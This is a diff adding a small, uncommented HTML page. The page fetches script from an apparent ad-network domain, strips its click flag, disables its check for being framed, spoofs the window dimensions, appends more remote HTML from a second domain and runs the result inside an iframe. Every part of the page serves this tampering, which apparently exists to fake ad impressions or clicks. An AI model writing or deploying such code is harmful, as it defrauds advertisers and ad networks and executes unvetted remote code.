@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+</head>
+<body>
+
+  <iframe id="id1" src="" height="768" width="1366" ></iframe>
+
+  <script>
+$.get("https://whautsis.com/4/8150310?var=z1", function(data, status){
+      var data1 = data.replace(/&clksf=1/g, "");
+      var data2 = data1.replace("window.self !== window.top", "false");
+      var data3 = data2.replace("l.document.documentElement.clientWidth", "1366");
+     var data4 = data3.replace("l.innerWidth || -1", "1366");
+      var data5 = data4.replace("l.innerHeight || -1", "768");
+    
+    $.get("https://note4you.xyz/xx4.html", function(dta, stus){
+      
+    var data6 = data5 + dta;
+    $("#id1").attr("srcdoc", data6);
+        
+  });
+
+        
+});
+</script>
+
+</body>
+</html>
